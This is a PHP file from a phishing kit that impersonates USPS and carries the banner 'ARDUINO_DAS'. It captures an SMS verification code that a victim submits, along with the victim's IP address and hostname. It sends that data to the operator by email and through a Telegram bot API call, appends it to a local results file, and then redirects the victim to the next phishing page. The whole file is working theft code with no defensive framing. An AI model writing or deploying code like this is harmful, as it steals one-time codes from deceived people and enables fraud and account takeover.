<?php
/*

  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$        /$$$$$$$   /$$$$$$   /$$$$$$ 
 /$$__  $$| $$__  $$| $$__  $$ /$$__  $$| $$$ | $$ /$$__  $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ $$ $$| $$  | $$      | $$  | $$| $$$$$$$$|  $$$$$$ 
| $$__  $$| $$__  $$| $$  | $$ >$$__  $$| $$  $$$$| $$  | $$      | $$  | $$| $$__  $$ \____  $$
| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$\  $$$| $$  | $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$/      | $$$$$$$/| $$  | $$|  $$$$$$/
|__/  |__/|__/  |__/|_______/  \______/ |__/  \__/ \______/       |_______/ |__/  |__/ \______/ 
                                                                                                
                                                                                                
                                                                                                

*/
error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(
	($_POST['sms'] != "") )
{
$hostname = gethostbyaddr($ip);
$message = "[========== ♠️ ⚡ ARDUINO_DAS USPS RZLT(SMS1) ⚡ ♠️ ===========]\r\n";
$message .= "|SMS1 		 : ".$_POST['sms']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "♠️ (".$_SESSION["name"].") SMS1 USPS RZLT ♠️ $ip";
$headers = "From: [ARD8NO_DAS **]<info@arduino.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
include "../files/html5.php";
$save=fopen("../../ARDUINO_DAS_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);


echo"<script>location.replace('../sms2.php');</script>";
}else{echo"error sending";}

?>
